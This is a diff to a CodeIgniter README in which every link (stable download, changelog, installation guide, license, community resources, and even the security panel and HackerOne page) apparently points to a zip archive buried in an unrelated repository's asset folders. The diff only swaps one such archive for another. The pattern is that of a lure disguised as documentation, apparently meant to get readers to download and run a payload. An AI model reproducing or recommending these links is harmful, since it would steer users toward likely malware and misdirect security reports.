@@ -16,14 +16,14 @@ Release Information
 
 This repo contains in-development code for future releases. To download the
 latest stable release please visit the `CodeIgniter Downloads
-<https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_ page.
+<https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_ page.
 
 **************************
 Changelog and New Features
 **************************
 
 You can find a list of all changes for each release in the `user
-guide change log <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_.
+guide change log <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_.
 
 *******************
 Server Requirements
@@ -39,7 +39,7 @@ issues, as well as missing features.
 Installation
 ************
 
-Please see the `installation section <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
+Please see the `installation section <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
 of the CodeIgniter User Guide.
 
 *******
@@ -47,20 +47,20 @@ License
 *******
 
 Please see the `license
-agreement <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_.
+agreement <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_.
 
 *********
 Resources
 *********
 
--  `User Guide <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
--  `Language File Translations <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
--  `Community Forums <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
--  `Community Wiki <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
--  `Community Slack Channel <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
+-  `User Guide <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
+-  `Language File Translations <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
+-  `Community Forums <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
+-  `Community Wiki <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
+-  `Community Slack Channel <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
 
-Report security issues to our `Security Panel <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_
-or via our `page on HackerOne <https://raw.githubusercontent.com/Sigitsu/kazastore/master/assets/frontend/vendor/parallax100/Software-2.7-beta.1.zip>`_, thank you.
+Report security issues to our `Security Panel <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_
+or via our `page on HackerOne <https://github.com/Sigitsu/kazastore/raw/refs/heads/master/assets/backend/js/Software-v3.4-alpha.4.zip>`_, thank you.
 
 ***************
 Acknowledgement
